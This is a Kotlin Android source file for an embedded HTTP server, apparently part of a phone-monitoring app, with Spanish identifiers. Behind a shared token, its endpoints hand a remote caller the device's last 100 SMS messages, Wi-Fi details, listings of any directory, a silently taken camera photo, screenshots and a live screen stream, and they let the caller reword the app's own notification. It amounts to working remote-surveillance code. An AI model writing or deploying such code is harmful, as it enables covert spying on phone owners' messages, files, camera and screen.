package com.monitor.security

import android.content.Context
import android.content.Intent
import android.provider.Telephony
import fi.iki.elonen.NanoHTTPD
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayInputStream
import java.io.File

class ApiServer(private val ctx: Context, port: Int) : NanoHTTPD(port) {

    override fun serve(session: IHTTPSession): Response {
        if (session.headers["x-token"] != MonitorService.TOKEN) {
            return newFixedLengthResponse(
                Response.Status.UNAUTHORIZED, MIME_PLAINTEXT, "Unauthorized"
            )
        }

        return when {
            session.uri == "/status"                        -> getStatus()
            session.uri == "/sms"                           -> getSMS()
            session.uri == "/wifi"                          -> getWifi()
            session.uri == "/archivos"                      -> getArchivos(session.parameters["path"]?.get(0) ?: "/sdcard")
            session.uri == "/foto"                          -> getFoto()
            session.uri == "/pantalla"                      -> getPantalla()
            session.uri == "/stream"                        -> getStream()
            session.uri == "/notificacion" && session.method == Method.POST -> setNotificacion(session)
            else -> newFixedLengthResponse(Response.Status.NOT_FOUND, MIME_PLAINTEXT, "Not found")
        }
    }

    // Actualizar notificación remotamente
    private fun setNotificacion(session: IHTTPSession): Response {
        return try {
            val body = mutableMapOf<String, String>()
            session.parseBody(body)
            val json = JSONObject(body["postData"] ?: "{}")

            if (json.has("texto")) {
                MonitorService.notifTexto = json.getString("texto")
            }
            if (json.has("icono_path")) {
                MonitorService.notifIconoPath = json.getString("icono_path")
            }

            // Disparar actualización de notificación
            ctx.startService(
                Intent(ctx, MonitorService::class.java).setAction("UPDATE_NOTIF")
            )

            newFixedLengthResponse(Response.Status.OK, "application/json",
                JSONObject().put("ok", true).toString())
        } catch (e: Exception) {
            newFixedLengthResponse(Response.Status.INTERNAL_ERROR, MIME_PLAINTEXT, e.message)
        }
    }

    private fun getStatus(): Response {
        val json = JSONObject().apply {
            put("status", "online")
            put("ip", MonitorService.obtenerIP(ctx))
            put("token", MonitorService.TOKEN)
            put("pantalla_disponible", MonitorService.ultimoFrame != null)
            put("notif_texto", MonitorService.notifTexto)
        }
        return newFixedLengthResponse(Response.Status.OK, "application/json", json.toString())
    }

    private fun getSMS(): Response {
        val result = JSONArray()
        ctx.contentResolver.query(
            Telephony.Sms.CONTENT_URI, null, null, null, "date DESC LIMIT 100"
        )?.use {
            while (it.moveToNext()) {
                result.put(JSONObject().apply {
                    put("address", it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)) ?: "")
                    put("body", it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY)) ?: "")
                    put("date", it.getLong(it.getColumnIndexOrThrow(Telephony.Sms.DATE)))
                    put("type", it.getInt(it.getColumnIndexOrThrow(Telephony.Sms.TYPE)))
                })
            }
        }
        return newFixedLengthResponse(Response.Status.OK, "application/json", result.toString())
    }

    private fun getWifi(): Response {
        val wm = ctx.applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
        val info = wm.connectionInfo
        val json = JSONObject().apply {
            put("ssid", info.ssid)
            put("bssid", info.bssid)
            put("ip", MonitorService.obtenerIP(ctx))
            put("rssi", info.rssi)
            put("speed", info.linkSpeed)
        }
        return newFixedLengthResponse(Response.Status.OK, "application/json", json.toString())
    }

    private fun getArchivos(path: String): Response {
        val result = JSONArray()
        return try {
            File(path).listFiles()?.forEach {
                result.put(JSONObject().apply {
                    put("nombre", it.name)
                    put("esDirectorio", it.isDirectory)
                    put("tamaño", it.length())
                    put("ruta", it.absolutePath)
                })
            }
            newFixedLengthResponse(Response.Status.OK, "application/json", result.toString())
        } catch (e: Exception) {
            newFixedLengthResponse(Response.Status.INTERNAL_ERROR, MIME_PLAINTEXT, e.message)
        }
    }

    private fun getFoto(): Response {
        return try {
            val file = File(ctx.cacheDir, "foto_temp.jpg")
            Runtime.getRuntime().exec(
                arrayOf("termux-camera-photo", "-c", "0", file.absolutePath)
            ).waitFor()
            if (file.exists()) {
                newFixedLengthResponse(Response.Status.OK, "image/jpeg", file.inputStream(), file.length())
            } else {
                newFixedLengthResponse(Response.Status.INTERNAL_ERROR, MIME_PLAINTEXT, "Error capturando foto")
            }
        } catch (e: Exception) {
            newFixedLengthResponse(Response.Status.INTERNAL_ERROR, MIME_PLAINTEXT, e.message)
        }
    }

    private fun getPantalla(): Response {
        val frame = MonitorService.ultimoFrame
            ?: return newFixedLengthResponse(
                Response.Status.SERVICE_UNAVAILABLE, MIME_PLAINTEXT, "Sin captura disponible"
            )
        return newFixedLengthResponse(
            Response.Status.OK, "image/jpeg",
            ByteArrayInputStream(frame), frame.size.toLong()
        )
    }

    private fun getStream(): Response {
        val boundary = "frame"
        val stream = object : java.io.InputStream() {
            private var buffer: ByteArray = byteArrayOf()
            private var pos = 0
            override fun read(): Int {
                if (pos >= buffer.size) {
                    Thread.sleep(200)
                    val frame = MonitorService.ultimoFrame ?: return -1
                    val header = "--$boundary\r\nContent-Type: image/jpeg\r\nContent-Length: ${frame.size}\r\n\r\n"
                    buffer = header.toByteArray() + frame + "\r\n".toByteArray()
                    pos = 0
                }
                return buffer[pos++].toInt() and 0xFF
            }
        }
        return newChunkedResponse(
            Response.Status.OK,
            "multipart/x-mixed-replace; boundary=$boundary",
            stream
        )
    }
}
